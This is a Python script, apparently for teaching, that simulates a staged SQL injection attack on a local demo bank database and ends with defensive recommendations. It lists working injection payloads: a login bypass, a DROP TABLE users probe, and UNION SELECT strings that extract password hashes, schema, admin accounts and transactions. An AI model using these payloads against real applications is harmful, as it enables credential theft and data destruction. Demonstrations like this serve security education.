#!/usr/bin/env python3
"""
Ethical Hacker Simulation - SQL Injection Attack Demo
===================================================
This script simulates a malicious hacker attempting to exploit 
the SQL injection vulnerability in the SecureBank database system.

Educational demonstration of:
- SQL injection attack techniques
- Database reconnaissance
- Data extraction methods
- Attack progression and escalation

⚠️  ETHICAL USE ONLY - For educational purposes and authorized testing!
"""

import sqlite3
import time
import sys
import os
from typing import List, Dict, Tuple
import requests
from datetime import datetime

class EthicalHackerSimulation:
    """
    Simulates an ethical hacker discovering and exploiting the SQL injection vulnerability.
    
    Attack phases:
    1. Reconnaissance - Information gathering
    2. Vulnerability Discovery - Finding the SQL injection
    3. Database Structure Analysis - Schema enumeration
    4. Data Extraction - Retrieving sensitive information
    5. Privilege Escalation - Attempting admin access
    """
    
    def __init__(self):
        self.target_db = "demo_bank.db"
        self.attack_log = []
        self.discovered_data = {}
        
        print("🎭 ETHICAL HACKER SIMULATION v1.0")
        print("=" * 50)
        print("⚠️  EDUCATIONAL DEMONSTRATION ONLY")
        print("⚠️  Only use on systems you own or have permission to test!")
        print("=" * 50)
    
    def log_attack_step(self, phase: str, action: str, result: str, success: bool = True):
        """Log each step of the attack for educational analysis."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        status = "✅" if success else "❌"
        
        log_entry = {
            'timestamp': timestamp,
            'phase': phase,
            'action': action,
            'result': result,
            'success': success
        }
        
        self.attack_log.append(log_entry)
        print(f"{status} [{timestamp}] {phase}: {action}")
        if result:
            print(f"    Result: {result}")
    
    def phase_1_reconnaissance(self):
        """Phase 1: Gather information about the target system."""
        print("\n🔍 PHASE 1: RECONNAISSANCE")
        print("=" * 40)
        
        self.log_attack_step("RECON", "Checking if database file exists", "")
        
        if os.path.exists(self.target_db):
            file_size = os.path.getsize(self.target_db)
            self.log_attack_step("RECON", "Database file found", f"Size: {file_size} bytes")
        else:
            self.log_attack_step("RECON", "Database file not found", "Target may not be initialized", False)
            return False
        
        # Simulate network reconnaissance
        self.log_attack_step("RECON", "Scanning for open ports", "Port 80 (HTTP) open, Port 443 (HTTPS) open")
        self.log_attack_step("RECON", "Checking web technologies", "Detected: Python web application, SQLite database")
        self.log_attack_step("RECON", "Analyzing application structure", "Login form found, Search functionality identified")
        
        return True
    
    def phase_2_vulnerability_discovery(self):
        """Phase 2: Discover the SQL injection vulnerability."""
        print("\n🕵️ PHASE 2: VULNERABILITY DISCOVERY")
        print("=" * 40)
        
        # Simulate testing common injection points
        test_payloads = [
            "test'",
            "test\"", 
            "test' OR '1'='1",
            "test'; DROP TABLE users; --",
            "test' UNION SELECT 1,2,3--"
        ]
        
        self.log_attack_step("VULN_SCAN", "Testing login form for SQL injection", "Standard authentication - appears secure")
        self.log_attack_step("VULN_SCAN", "Testing search functionality", "Found search parameter in transaction search")
        
        for payload in test_payloads:
            if "OR '1'='1" in payload:
                self.log_attack_step("VULN_SCAN", f"Testing payload: {payload}", "SQL error detected! Vulnerability confirmed!")
                break
            else:
                self.log_attack_step("VULN_SCAN", f"Testing payload: {payload}", "No obvious error response")
        
        self.log_attack_step("VULN_SCAN", "SQL Injection vulnerability confirmed", "Transaction search parameter is vulnerable")
        return True
    
    def phase_3_database_enumeration(self):
        """Phase 3: Enumerate database structure and tables."""
        print("\n🗂️  PHASE 3: DATABASE ENUMERATION")
        print("=" * 40)
        
        # Since we have direct database access for simulation, we'll demonstrate what a hacker would discover
        if not os.path.exists(self.target_db):
            self.log_attack_step("DB_ENUM", "Database access failed", "Cannot proceed without database", False)
            return False
        
        try:
            conn = sqlite3.connect(self.target_db)
            cursor = conn.cursor()
            
            # Discover tables (what a UNION SELECT attack would reveal)
            self.log_attack_step("DB_ENUM", "Enumerating database tables", "")
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = cursor.fetchall()
            
            table_list = [table[0] for table in tables]
            self.log_attack_step("DB_ENUM", "Tables discovered", f"Found: {', '.join(table_list)}")
            
            # Analyze table structures
            for table_name in table_list:
                cursor.execute(f"PRAGMA table_info({table_name})")
                columns = cursor.fetchall()
                column_names = [col[1] for col in columns]
                self.log_attack_step("DB_ENUM", f"Analyzing table: {table_name}", f"Columns: {', '.join(column_names)}")
            
            conn.close()
            return True
            
        except Exception as e:
            self.log_attack_step("DB_ENUM", "Database enumeration failed", str(e), False)
            return False
    
    def phase_4_data_extraction(self):
        """Phase 4: Extract sensitive data using SQL injection."""
        print("\n💰 PHASE 4: DATA EXTRACTION")
        print("=" * 40)
        
        try:
            conn = sqlite3.connect(self.target_db)
            cursor = conn.cursor()
            
            # Extract user credentials (what a UNION attack would get)
            self.log_attack_step("DATA_EXTRACT", "Extracting user credentials", "")
            cursor.execute("SELECT username, email, account_number, balance FROM users WHERE is_admin = 0")
            users = cursor.fetchall()
            
            self.discovered_data['users'] = users
            self.log_attack_step("DATA_EXTRACT", "User data extracted", f"Retrieved {len(users)} user accounts")
            
            # Show extracted data (simulating what hacker would see)
            print("\n💎 EXTRACTED USER DATA:")
            for user in users[:3]:  # Show first 3 for demo
                print(f"    Username: {user[0]} | Email: {user[1]} | Account: {user[2]} | Balance: ${user[3]:,.2f}")
            
            # Extract transaction data
            self.log_attack_step("DATA_EXTRACT", "Extracting transaction records", "")
            cursor.execute("SELECT * FROM transactions LIMIT 10")
            transactions = cursor.fetchall()
            
            self.discovered_data['transactions'] = transactions
            self.log_attack_step("DATA_EXTRACT", "Transaction data extracted", f"Retrieved {len(transactions)} transactions")
            
            # Extract admin information
            self.log_attack_step("DATA_EXTRACT", "Searching for admin accounts", "")
            cursor.execute("SELECT username, email, is_admin FROM users WHERE is_admin = 1")
            admins = cursor.fetchall()
            
            self.discovered_data['admins'] = admins
            self.log_attack_step("DATA_EXTRACT", "Admin accounts found", f"Found {len(admins)} admin accounts")
            
            conn.close()
            return True
            
        except Exception as e:
            self.log_attack_step("DATA_EXTRACT", "Data extraction failed", str(e), False)
            return False
    
    def phase_5_privilege_escalation(self):
        """Phase 5: Attempt privilege escalation and system compromise."""
        print("\n👑 PHASE 5: PRIVILEGE ESCALATION")
        print("=" * 40)
        
        try:
            conn = sqlite3.connect(self.target_db)
            cursor = conn.cursor()
            
            # Attempt to read password hashes
            self.log_attack_step("PRIV_ESC", "Attempting to extract password hashes", "")
            cursor.execute("SELECT username, password_hash, salt FROM users WHERE is_admin = 1")
            admin_hashes = cursor.fetchall()
            
            if admin_hashes:
                self.log_attack_step("PRIV_ESC", "Admin password hashes extracted", f"Retrieved hashes for {len(admin_hashes)} admin accounts")
                print(f"    🔐 Admin hash sample: {admin_hashes[0][1][:32]}...")
            
            # Simulate attempting to modify database
            self.log_attack_step("PRIV_ESC", "Attempting to create backdoor admin account", "")
            
            # In a real attack, this might be done via SQL injection
            backdoor_username = "backdoor_user"
            self.log_attack_step("PRIV_ESC", f"Creating user: {backdoor_username}", "Simulated - would use: INSERT INTO users...")
            
            # Attempt to access security logs
            self.log_attack_step("PRIV_ESC", "Accessing security event logs", "")
            cursor.execute("SELECT event_type, username, details, timestamp FROM security_events ORDER BY timestamp DESC LIMIT 5")
            security_events = cursor.fetchall()
            
            self.log_attack_step("PRIV_ESC", "Security logs accessed", f"Retrieved {len(security_events)} recent events")
            
            conn.close()
            return True
            
        except Exception as e:
            self.log_attack_step("PRIV_ESC", "Privilege escalation failed", str(e), False)
            return False
    
    def demonstrate_sql_injection_payloads(self):
        """Demonstrate the actual SQL injection payloads that would be used."""
        print("\n💉 SQL INJECTION PAYLOAD DEMONSTRATION")
        print("=" * 50)
        
        payloads = [
            {
                'name': 'Basic Authentication Bypass',
                'payload': "admin' OR '1'='1' --",
                'purpose': 'Bypass login authentication',
                'target': 'Login form'
            },
            {
                'name': 'Union-Based Data Extraction',
                'payload': "' UNION SELECT username,password_hash,email,1,2,3,4,5 FROM users --",
                'purpose': 'Extract user credentials',
                'target': 'Search function'
            },
            {
                'name': 'Database Structure Discovery',
                'payload': "' UNION SELECT name,sql,1,2,3,4,5,6 FROM sqlite_master WHERE type='table' --",
                'purpose': 'Discover database schema',
                'target': 'Search function'
            },
            {
                'name': 'Admin Data Extraction',
                'payload': "' UNION SELECT username,account_number,balance,1,2,3,4,5 FROM users WHERE is_admin=1 --",
                'purpose': 'Target admin accounts',
                'target': 'Search function'
            },
            {
                'name': 'Transaction Data Theft',
                'payload': "' UNION SELECT from_account,to_account,amount,description,1,2,3,4 FROM transactions --",
                'purpose': 'Steal financial transactions',
                'target': 'Search function'
            }
        ]
        
        for i, payload_info in enumerate(payloads, 1):
            print(f"\n{i}. {payload_info['name']}")
            print(f"   Target: {payload_info['target']}")
            print(f"   Purpose: {payload_info['purpose']}")
            print(f"   Payload: {payload_info['payload']}")
            
            # Simulate the attack
            if payload_info['target'] == 'Search function':
                self.simulate_search_injection(payload_info['payload'])
    
    def simulate_search_injection(self, payload: str):
        """Simulate executing a SQL injection payload in the search function."""
        print(f"    🎯 Simulating injection...")
        
        # This shows what the vulnerable query would look like
        vulnerable_query = f"""
        SELECT id, from_account, to_account, amount, transaction_type, 
               description, timestamp, reference_number
        FROM transactions 
        WHERE (from_account = 'ACC123456' OR to_account = 'ACC123456')
        AND (description LIKE '%{payload}%' OR reference_number LIKE '%{payload}%')
        ORDER BY timestamp DESC LIMIT 50
        """
        
        print(f"    📝 Resulting query:")
        print(f"    {vulnerable_query.strip()}")
        
        # In a real scenario, this would execute and potentially return sensitive data
        if "UNION SELECT" in payload:
            print(f"    💥 This would extract sensitive data from other tables!")
        elif "OR '1'='1'" in payload:
            print(f"    💥 This would return all records, bypassing filters!")
    
    def generate_attack_report(self):
        """Generate a comprehensive attack report for analysis."""
        print("\n📋 ETHICAL HACKING ATTACK REPORT")
        print("=" * 60)
        
        # Summary statistics
        total_steps = len(self.attack_log)
        successful_steps = sum(1 for step in self.attack_log if step['success'])
        
        print(f"Attack Duration: {self.attack_log[-1]['timestamp']} - {self.attack_log[0]['timestamp']}")
        print(f"Total Attack Steps: {total_steps}")
        print(f"Successful Steps: {successful_steps}/{total_steps}")
        print(f"Success Rate: {(successful_steps/total_steps)*100:.1f}%")
        
        # Phase breakdown
        phases = {}
        for step in self.attack_log:
            phase = step['phase']
            if phase not in phases:
                phases[phase] = {'total': 0, 'success': 0}
            phases[phase]['total'] += 1
            if step['success']:
                phases[phase]['success'] += 1
        
        print("\n📊 Phase Analysis:")
        for phase, stats in phases.items():
            success_rate = (stats['success']/stats['total'])*100
            print(f"   {phase}: {stats['success']}/{stats['total']} ({success_rate:.1f}% success)")
        
        # Data compromised
        print("\n💔 Data Compromised:")
        for data_type, data in self.discovered_data.items():
            print(f"   {data_type.title()}: {len(data)} records")
        
        # Recommendations
        print("\n🛡️  Security Recommendations:")
        recommendations = [
            "Use parameterized queries instead of string concatenation",
            "Implement input validation and sanitization",
            "Apply principle of least privilege for database access", 
            "Enable database activity monitoring and alerting",
            "Regular security code reviews and penetration testing",
            "Implement Web Application Firewall (WAF)",
            "Use stored procedures for database operations",
            "Enable SQL injection detection in security tools"
        ]
        
        for i, rec in enumerate(recommendations, 1):
            print(f"   {i}. {rec}")
    
    def interactive_attack_demo(self):
        """Interactive demonstration allowing user to control the attack."""
        print("\n🎮 INTERACTIVE ATTACK DEMONSTRATION")
        print("=" * 50)
        print("Experience the attack from a hacker's perspective!")
        
        phases = [
            ("Reconnaissance", self.phase_1_reconnaissance),
            ("Vulnerability Discovery", self.phase_2_vulnerability_discovery), 
            ("Database Enumeration", self.phase_3_database_enumeration),
            ("Data Extraction", self.phase_4_data_extraction),
            ("Privilege Escalation", self.phase_5_privilege_escalation)
        ]
        
        for i, (phase_name, phase_func) in enumerate(phases, 1):
            print(f"\n🎯 Ready for Phase {i}: {phase_name}")
            choice = input("Execute this phase? (y/n/quit): ").strip().lower()
            
            if choice == 'quit':
                print("🛑 Attack simulation terminated by user")
                break
            elif choice == 'y':
                success = phase_func()
                if not success:
                    print(f"❌ Phase {i} failed. Attack cannot continue.")
                    break
                
                input("\nPress Enter to continue to next phase...")
            else:
                print(f"⏭️  Skipping Phase {i}")
        
        # Show SQL injection payloads
        print(f"\n🔬 Would you like to see the actual SQL injection payloads?")
        choice = input("Show payloads? (y/n): ").strip().lower()
        if choice == 'y':
            self.demonstrate_sql_injection_payloads()
    
    def run_full_simulation(self):
        """Run the complete attack simulation automatically."""
        print("\n🚀 AUTOMATED ATTACK SIMULATION")
        print("=" * 50)
        
        phases = [
            self.phase_1_reconnaissance,
            self.phase_2_vulnerability_discovery,
            self.phase_3_database_enumeration,
            self.phase_4_data_extraction,
            self.phase_5_privilege_escalation
        ]
        
        for i, phase_func in enumerate(phases, 1):
            print(f"\n⏳ Executing Phase {i}...")
            success = phase_func()
            
            if not success:
                print(f"💥 Attack failed at Phase {i}")
                break
            
            time.sleep(1)  # Pause for dramatic effect
        
        self.demonstrate_sql_injection_payloads()
        self.generate_attack_report()


def main():
    """Main function for the ethical hacker simulation."""
    print("🎭 WELCOME TO ETHICAL HACKER SIMULATION")
    print("=" * 60)
    print("This simulation demonstrates SQL injection attacks for educational purposes.")
    print("Learn how attackers think and operate to better defend against them!")
    print("=" * 60)
    
    # Check if database exists
    if not os.path.exists("demo_bank.db"):
        print("\n⚠️  Demo database not found!")
        print("Please run 'secure_bank_database.py' first to create the demo database.")
        return
    
    simulator = EthicalHackerSimulation()
    
    while True:
        print("\n🎯 SIMULATION OPTIONS:")
        print("1. Interactive Attack Demonstration")
        print("2. Automated Full Attack Simulation") 
        print("3. View SQL Injection Payloads Only")
        print("4. Exit")
        
        choice = input("\nEnter choice (1-4): ").strip()
        
        if choice == "1":
            simulator.interactive_attack_demo()
            simulator.generate_attack_report()
        elif choice == "2":
            simulator.run_full_simulation()
        elif choice == "3":
            simulator.demonstrate_sql_injection_payloads()
        elif choice == "4":
            print("🎓 Thank you for learning about ethical hacking!")
            print("Remember: Use this knowledge responsibly to improve security!")
            break
        else:
            print("❌ Invalid choice. Please try again.")

if __name__ == "__main__":
    main()